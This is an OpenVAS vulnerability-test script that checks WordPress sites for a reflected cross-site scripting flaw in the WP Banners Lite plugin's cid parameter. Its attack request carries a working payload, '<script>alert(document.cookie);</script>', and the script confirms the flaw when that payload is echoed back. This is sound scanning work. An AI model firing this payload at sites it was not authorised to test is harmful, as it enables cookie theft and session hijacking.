###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wp_banners_lite_xss_vuln.nasl 9353 2018-04-06 07:14:20Z cfischer $
#
# Wordpress WP Banners Lite Plugin Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to execute
arbitrary HTML or web script in a user's browser session in context of an
affected site.

Impact Level: Application";

tag_summary = "This host is installed with Wordpress WP Banners Lite Plugin and
is prone to xss vulnerability.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_insight = "The flaw is due to improper validation of user-supplied input to
the wpbanners_show.php script via cid parameter.";

tag_affected = "Wordpress WP Banners Lite Plugin version 1.40 and prior";

if(description)
{
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_oid("1.3.6.1.4.1.25623.1.0.803450");
  script_version("$Revision: 9353 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:14:20 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2013-03-26 15:56:32 +0530 (Tue, 26 Mar 2013)");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_name("Wordpress WP Banners Lite Plugin Cross Site Scripting Vulnerability");

  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120928");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2013/Mar/209");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/wp-banners-lite-140-cross-site-scripting");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
port = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_dir_from_kb(port:port, app:"WordPress")){
  exit(0);
}

## Construct the Attack Request
url = dir + "/wp-content/plugins/wp-banners-lite/wpbanners_show.php?"+
                "id=1&cid=a_<script>alert(document.cookie);</script>";

## Try attack and check the response to confirm vulnerability.
if(http_vuln_check(port:port, url:url,
        pattern:"<script>alert\(document.cookie\);</script>", check_header:TRUE))
{
  security_message(port);
  exit(0);
}
